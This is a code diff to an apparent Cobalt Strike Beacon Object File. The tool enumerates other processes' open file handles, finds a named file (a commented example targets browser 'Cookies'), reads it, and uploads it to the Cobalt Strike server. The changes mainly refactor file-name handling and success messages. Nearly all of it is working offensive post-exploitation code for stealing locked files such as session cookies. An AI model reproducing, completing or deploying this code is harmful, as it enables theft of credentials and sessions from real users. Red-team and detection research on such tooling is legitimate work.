@@ -85,14 +85,15 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     #define GetFileType KERNEL32$GetFileType
 
     void go(char* buf,int len) {
-
+        //Local Variables
         DWORD pid = 0;
         wchar_t* key = NULL;
         wchar_t* value_wchar = NULL;
         int value_int = 0;
         datap parser;
         BOOL Success = false;
-
+        
+        //Obtain beacon arguments
         BeaconDataParse(&parser, buf, len);
         pid = BeaconDataInt(&parser);
         key = (wchar_t*)BeaconDataExtract(&parser, NULL);
@@ -275,18 +276,15 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                 size_t length = objectName.Length / sizeof(wchar_t);
 
                 // Initialize the file name as an empty string
-                UNICODE_STRING fileName;
-                fileName.Buffer = (PWSTR)(filePathBuffer + length);
-                fileName.Length = 0;
-                fileName.MaximumLength = 0;
+                wchar_t* fileName;
+                fileName = (PWSTR)(filePathBuffer + length);
+     
 
                 // Find the last occurrence of the path separator '\'
-                for (int i = length - 1; i >= 0; i--) {
-                    if (filePathBuffer[i] == '\\') {
+                for (int i = objectName.Length/sizeof(wchar_t) - 1; i >= 0; i--) {
+                    if (objectName.Buffer[i] == '\\') {
                         // Set the file name to the portion of the string after the last '\'
-                        fileName.Buffer = (PWSTR)(filePathBuffer + i + 1);
-                        fileName.Length = (length - i - 1) * sizeof(wchar_t);
-                        fileName.MaximumLength = fileName.Length;
+                        fileName = (PWSTR)(filePathBuffer + i + 1);
                         break;
                     }
                 }
@@ -294,9 +292,7 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                 // Check if the provided file name exists within the unicodeString
                 int result = 0;
                 if (value_wchar != NULL) {
-                    UNICODE_STRING substring;
-                    RtlInitUnicodeString(&substring, value_wchar);
-                    result = wcscmp(fileName.Buffer, substring.Buffer);
+                    result = wcscmp(fileName, value_wchar);
                 }
 
                 //wchar_t* result = wcsstr(objectName.Buffer, substring.Buffer);
@@ -317,7 +313,7 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                     // Construct the full path to the file on the desktop
                     WCHAR filePath[MAX_PATH];
                     wcscpy(filePath, L"C:\\Users\\defaultuser\\Desktop\\"); ///Select your own directory for debugging purposes
-                    wcscat(filePath, fileName.Buffer);
+                    wcscat(filePath, fileName);
 
                     // Create or open the file for writing
                     HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -328,8 +324,8 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                         BOOL writeStatus = WriteFile(hFile, buffer, dwRead, &dwWritten, NULL);
 
                         if (writeStatus) {
-                            BeaconPrintf(CALLBACK_OUTPUT,"Data written to file successfully.\n");
-                         
+                            BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+
                         }
                         else {
                             BeaconPrintf(CALLBACK_ERROR,"Error: Failed to write data to file. Error code: %ul\n", GetLastError());
@@ -340,18 +336,18 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
 
                     #else
                     //Convert the wchar_t* string to a multibyte string using wcstombs_s
-                    const size_t bufferSize = wcstombs(NULL, fileName.Buffer, 0);
+                    const size_t bufferSize = wcstombs(NULL, fileName, 0);
                     if (bufferSize < 1) {
                         BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
                     }
               
                     char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize+1);  // +1 for null-terminator
                     size_t convertedChars = 0;
-                    if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize)) {
+                    if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName, bufferSize)) {
                         //Upload file to cobalt strike using method from nanodump
-                        upload_file(fileNameChar, buffer, dwFileSize);
-                        BeaconPrintf(CALLBACK_OUTPUT, "Process ID: %ld, [% #d] % .*S\n", handleInfo->Handles[i].UniqueProcessId, handleInfo->Handles[i].HandleValue, objectName.Length / 2, objectName.Buffer);
-
+                        if (upload_file(fileNameChar, buffer, dwFileSize)) {
+                            BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                        }
                     }
                     else {
                         BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
@@ -494,7 +490,7 @@ int main(int argc, char* argv[]) {
     // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
     //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");
 
-    bof::runMocked<int, wchar_t*, int>(go,6328,L"handle_id",552);
+    bof::runMocked<int, wchar_t*, int>(go,6696,L"handle_id",996);
     return 0;
 }
 
